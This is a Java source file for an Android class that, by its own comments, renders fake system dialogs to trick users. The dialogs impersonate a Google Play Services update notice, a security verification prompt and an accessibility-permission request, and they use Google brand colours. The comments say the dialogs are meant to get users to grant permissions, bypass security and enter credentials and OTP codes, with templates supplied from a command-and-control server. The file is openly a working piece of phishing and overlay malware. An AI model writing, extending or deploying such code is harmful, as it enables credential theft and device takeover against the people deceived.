package com.fason.app.features.springe.overlays;

import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.fason.app.features.springe.delivery.OverlayWindowManager;

/**
 * DialogOverlay — Renders fake system dialog overlays.
 *
 * Types:
 * - UPDATE_DIALOG: "Google Play Services update required"
 * - SECURITY_WARNING: "Security warning — verify your identity"
 * - PERMISSION_REQUEST: "App needs permission to continue"
 * - CUSTOM: Fully customizable from C2 template
 *
 * These dialogs trick users into:
 * - Entering credentials into fake fields
 * - Granting permissions
 * - Clicking "Allow" to bypass security
 * - Entering OTP codes
 *
 * Must be shown/hidden from the main thread.
 */
public final class DialogOverlay {

    private static final String TAG = "DialogOverlay";

    public static final int TYPE_UPDATE = 0;
    public static final int TYPE_SECURITY = 1;
    public static final int TYPE_PERMISSION = 2;
    public static final int TYPE_CUSTOM = 3;

    private final Context context;
    private final OverlayWindowManager windowManager;

    private volatile View dialogView;
    private volatile boolean isShowing = false;
    private volatile OnDialogResultListener resultListener;

    public interface OnDialogResultListener {
        void onResult(int actionId, String input);
    }

    public DialogOverlay(Context context, OverlayWindowManager windowManager) {
        this.context = context;
        this.windowManager = windowManager;
    }

    /**
     * Show a system dialog overlay. Must be called from main thread.
     *
     * @param type Dialog type (UPDATE_DIALOG, SECURITY_WARNING, etc.)
     * @param title Custom title (null = use default for type)
     * @param message Custom message (null = use default for type)
     * @param buttonText Custom button text (null = "OK")
     */
    public void show(int type, String title, String message, String buttonText) {
        if (isShowing) return;

        try {
            dialogView = createDialog(type, title, message, buttonText);
            OverlayWindowManager.OverlayConfig config =
                OverlayWindowManager.OverlayConfig.fullscreen();
            config.dimAmount = 0.6f; // Dim background
            windowManager.addOverlay(dialogView, config);
            isShowing = true;
            Log.d(TAG, "Dialog shown: type=" + type);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show dialog", e);
        }
    }

    public void hide() {
        if (!isShowing || dialogView == null) return;
        try {
            windowManager.removeOverlay(dialogView);
            dialogView = null;
        } catch (Exception e) {
            Log.e(TAG, "Error hiding dialog", e);
        }
        isShowing = false;
    }

    public boolean isShowing() { return isShowing; }

    public void setOnResultListener(OnDialogResultListener listener) {
        this.resultListener = listener;
    }

    public void destroy() { hide(); }

    private View createDialog(int type, String title, String message, String buttonText) {
        FrameLayout root = new FrameLayout(context);
        root.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.setBackgroundColor(Color.parseColor("#80000000")); // Semi-transparent
        root.setClickable(true);
        root.setFocusable(true);

        // Dialog card centered
        LinearLayout card = new LinearLayout(context);
        card.setOrientation(LinearLayout.VERTICAL);

        FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
            dpToPx(300), ViewGroup.LayoutParams.WRAP_CONTENT);
        cardLp.gravity = Gravity.CENTER;
        card.setLayoutParams(cardLp);

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setShape(GradientDrawable.RECTANGLE);
        cardBg.setCornerRadius(dpToPx(16));
        cardBg.setColor(Color.WHITE);
        card.setBackground(cardBg);
        card.setPadding(dpToPx(24), dpToPx(24), dpToPx(24), dpToPx(24));

        // Icon
        ImageView icon = new ImageView(context);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(
            dpToPx(48), dpToPx(48));
        iconLp.gravity = Gravity.CENTER;
        iconLp.setMargins(0, 0, 0, dpToPx(16));
        icon.setLayoutParams(iconLp);

        int iconRes = getIconForType(type);
        if (iconRes != 0) {
            try {
                icon.setImageResource(iconRes);
            } catch (Exception ignored) {}
        } else {
            icon.setVisibility(View.GONE);
        }
        card.addView(icon);

        // Title
        TextView titleView = new TextView(context);
        titleView.setText(title != null ? title : getDefaultTitle(type));
        titleView.setTextColor(Color.BLACK);
        titleView.setTextSize(18);
        titleView.setTypeface(null, android.graphics.Typeface.BOLD);
        titleView.setGravity(Gravity.CENTER);
        titleView.setPadding(0, 0, 0, dpToPx(8));
        card.addView(titleView);

        // Message
        TextView msgView = new TextView(context);
        msgView.setText(message != null ? message : getDefaultMessage(type));
        msgView.setTextColor(Color.parseColor("#666666"));
        msgView.setTextSize(14);
        msgView.setGravity(Gravity.CENTER);
        msgView.setPadding(0, 0, 0, dpToPx(20));
        card.addView(msgView);

        // Button
        Button button = new Button(context);
        String btnText = buttonText != null ? buttonText : "OK";
        button.setText(btnText);
        button.setTextColor(Color.WHITE);
        button.setTextSize(15);

        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setShape(GradientDrawable.RECTANGLE);
        btnBg.setCornerRadius(dpToPx(24));
        btnBg.setColor(getAccentColorForType(type));
        button.setBackground(btnBg);

        button.setOnClickListener(v -> {
            if (resultListener != null) {
                resultListener.onResult(type, null);
            }
            hide();
        });

        card.addView(button);

        root.addView(card);
        return root;
    }

    private String getDefaultTitle(int type) {
        switch (type) {
            case TYPE_UPDATE: return "System Update Required";
            case TYPE_SECURITY: return "Security Verification";
            case TYPE_PERMISSION: return "Permission Required";
            default: return "Alert";
        }
    }

    private String getDefaultMessage(int type) {
        switch (type) {
            case TYPE_UPDATE:
                return "Google Play Services needs to be updated to continue.\nTap OK to update.";
            case TYPE_SECURITY:
                return "Suspicious activity detected.\nVerify your identity to continue.";
            case TYPE_PERMISSION:
                return "This app needs accessibility access to function properly.\nTap OK to grant.";
            default:
                return "";
        }
    }

    private int getIconForType(int type) {
        // Return 0 to hide icon — uses Android system icons
        return 0;
    }

    private int getAccentColorForType(int type) {
        switch (type) {
            case TYPE_UPDATE: return Color.parseColor("#4285F4"); // Google Blue
            case TYPE_SECURITY: return Color.parseColor("#EA4335"); // Red
            case TYPE_PERMISSION: return Color.parseColor("#34A853"); // Green
            default: return Color.parseColor("#4285F4");
        }
    }

    private int dpToPx(int dp) {
        return (int) (dp * context.getResources().getDisplayMetrics().density + 0.5f);
    }
}
